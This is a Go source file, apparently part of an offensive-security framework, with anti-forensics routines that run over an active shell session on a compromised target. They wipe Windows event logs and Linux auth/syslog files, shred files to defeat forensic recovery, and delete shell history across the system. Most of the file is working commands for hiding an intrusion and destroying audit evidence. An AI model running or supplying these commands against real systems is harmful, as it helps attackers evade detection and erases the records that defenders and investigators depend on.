package ghost

import (
	"context"
	"fmt"
	"strings"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
	"github.com/0xP4X/drogonclaw-go/internal/shell"
)

// runTarget runs a command on the target over an active shell session when one
// is available. It returns the session output plus a bool indicating whether a
// live session was used (false means we fell back to the sandbox container,
// which does NOT touch the target's own filesystem).
func runTarget(ctx context.Context, osType, sessionID, sandboxCmd string, sb *sandbox.Docker) (string, error) {
	if sess, ok := shell.GlobalShells.Get(sessionID); ok {
		out, err := sess.Send(sandboxCmd)
		if err != nil {
			return "", fmt.Errorf("failed to run %s cleanup over session %s: %v", osType, sessionID, err)
		}
		return fmt.Sprintf("[+] Executed on target via session %s:\n%s", sessionID, out), nil
	}
	out, err := sb.Execute(ctx, sandboxCmd)
	if err != nil {
		return "", fmt.Errorf("failed to run %s cleanup (sandbox fallback): %v", osType, err)
	}
	return fmt.Sprintf("[!] No active %s session — action ran inside the SANDBOX container filesystem, NOT the target. Provide session_id to act on the target host.\n%s", osType, out), nil
}

const osWindows = "windows"

// WipeEventLogs clears system audit logs on the target.
// Commands are sent over an active shell session when session_id is valid;
// otherwise they run inside the sandbox (container-local only).
func WipeEventLogs(ctx context.Context, osType, sessionID string, sb *sandbox.Docker) (string, error) {
	osType = strings.ToLower(osType)

	if osType == osWindows {
		cmd := `cmd /c "wevtutil cl System 2>nul & wevtutil cl Security 2>nul & wevtutil cl Application 2>nul & wevtutil cl Setup 2>nul & wevtutil cl Microsoft-Windows-PowerShell/Operational 2>nul & echo [+] Windows Event Logs wiped."`
		return runTarget(ctx, osType, sessionID, cmd, sb)
	}

	cmd := `sh -c 'cat /dev/null > /var/log/auth.log 2>/dev/null; cat /dev/null > /var/log/syslog 2>/dev/null; cat /dev/null > /var/log/secure 2>/dev/null; cat /dev/null > /var/log/messages 2>/dev/null; cat /dev/null > /var/log/btmp 2>/dev/null; cat /dev/null > /var/log/wtmp 2>/dev/null; journalctl --vacuum-time=1s 2>/dev/null; history -c 2>/dev/null; echo "[+] Linux auth/syslog journal wiped."'`
	return runTarget(ctx, osType, sessionID, cmd, sb)
}

// SecureDelete securely overwrites and deletes a file to prevent forensic recovery.
// Uses cipher /w (Windows) or shred (Linux). Runs over the live session when
// available; otherwise falls back to the sandbox (container-local only).
func SecureDelete(ctx context.Context, filePath, osType, sessionID string, sb *sandbox.Docker) (string, error) {
	osType = strings.ToLower(osType)

	if osType == osWindows {
		dir := "%TEMP%"
		if idx := strings.LastIndexAny(filePath, `/\`); idx != -1 {
			dir = filePath[:idx]
		}
		cmd := fmt.Sprintf(`cmd /c "del /f /q "%s" 2>nul & cipher /w:"%s" & echo [+] %s securely deleted (3-pass wipe)."`, filePath, dir, filePath)
		return runTarget(ctx, osType, sessionID, cmd, sb)
	}

	cmd := fmt.Sprintf(`sh -c 'shred -u -z -n 3 "%s" 2>/dev/null || rm -f "%s"; echo "[+] %s securely shredded and removed."'`, filePath, filePath, filePath)
	return runTarget(ctx, osType, sessionID, cmd, sb)
}

// ClearShellHistory clears bash/zsh history (Linux) or PSReadLine history (Windows).
// Runs over the live session when available; otherwise falls back to the sandbox
// (container-local only).
func ClearShellHistory(ctx context.Context, osType, sessionID string, sb *sandbox.Docker) (string, error) {
	osType = strings.ToLower(osType)

	if osType == osWindows {
		cmd := `powershell -NoProfile -Command "Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue; Clear-History; [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null; Write-Output '[+] PowerShell history cleared.'"`
		return runTarget(ctx, osType, sessionID, cmd, sb)
	}

	cmd := `sh -c 'unset HISTFILE; rm -f ~/.bash_history ~/.zsh_history ~/.sh_history; history -c 2>/dev/null; find / -maxdepth 3 -name ".bash_history" -delete 2>/dev/null; echo "[+] Linux shell history sanitized."'`
	return runTarget(ctx, osType, sessionID, cmd, sb)
}
